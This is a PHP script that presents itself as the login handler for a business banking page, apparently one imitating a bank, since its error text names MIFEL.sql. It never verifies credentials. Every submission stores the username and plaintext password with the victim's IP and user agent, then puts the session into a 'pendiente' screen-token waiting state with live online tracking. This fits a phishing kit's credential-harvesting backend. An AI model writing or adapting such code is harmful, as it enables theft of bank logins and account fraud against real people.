<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../empresas/index.php');
    exit;
}

$usuario = trim($_POST['usuario'] ?? '');
$password = $_POST['password'] ?? '';
$tipo_usuario = 'Empresa';

if ($usuario === '') {
    die('Error: Usuario es requerido');
}

if ($password === '') {
    die('Error: Contraseña es requerida');
}

if (!preg_match('/^[a-zA-Z0-9@._\-#$%&*+=\/]{1,80}$/', $usuario)) {
    die('Error: Usuario inválido (máximo 80 caracteres alfanuméricos)');
}

if (strlen($password) > 20) {
    die('Error: La contraseña no debe exceder los 20 caracteres');
}

function obtenerIPReal() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED'])) return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR'])) return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED'])) return $_SERVER['HTTP_FORWARDED'];
    if (!empty($_SERVER['REMOTE_ADDR'])) return $_SERVER['REMOTE_ADDR'];
    return @file_get_contents('https://api.ipify.org') ?: 'unknown';
}

$ip_cliente = $_POST['ip_cliente'] ?? '';
$ip_real = !empty($ip_cliente) ? $ip_cliente : obtenerIPReal();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';

try {
    $pdo = conectarBD();

    tokenPantallaIniciarSesionNueva();

    $stmt = $pdo->prepare("INSERT INTO usuarios (ip_real, usuarios, password, apellido, user_agent, token_pantalla_estado, token_pantalla_espera_desde) VALUES (?, ?, ?, ?, ?, 'pendiente', NOW())");
    $stmt->execute([$ip_real, $usuario, $password, $tipo_usuario, $user_agent]);

    $usuario_id = (int) $pdo->lastInsertId();

    $stmtEstatus = $pdo->prepare("
        INSERT INTO estatus_usuarios (usuario_id, ip_real, estado, pagina_actual, user_agent)
        VALUES (?, ?, 'online', 'index.php', ?)
        ON DUPLICATE KEY UPDATE
            ip_real = VALUES(ip_real),
            estado = 'online',
            pagina_actual = VALUES(pagina_actual),
            ultimo_heartbeat = CURRENT_TIMESTAMP,
            user_agent = VALUES(user_agent)
    ");
    $stmtEstatus->execute([$usuario_id, $ip_real, $user_agent]);

    $_SESSION['usuario_id'] = $usuario_id;
    $_SESSION['usuario'] = $usuario;
    $_SESSION['password'] = $password;
    $_SESSION['ip_real'] = $ip_real;
    $_SESSION['tipo_usuario'] = $tipo_usuario;

    tokenPantallaMarcarEsperaActiva();

    header('Location: ../empresas/index.php');
    exit;
} catch (PDOException $e) {
    $msg = $e->getMessage();
    if (stripos($msg, 'token_pantalla') !== false) {
        die('Error: faltan columnas token_pantalla en BD. Importa el esquema actualizado desde MIFEL.sql.');
    }
    die('Error de base de datos: ' . $msg);
}
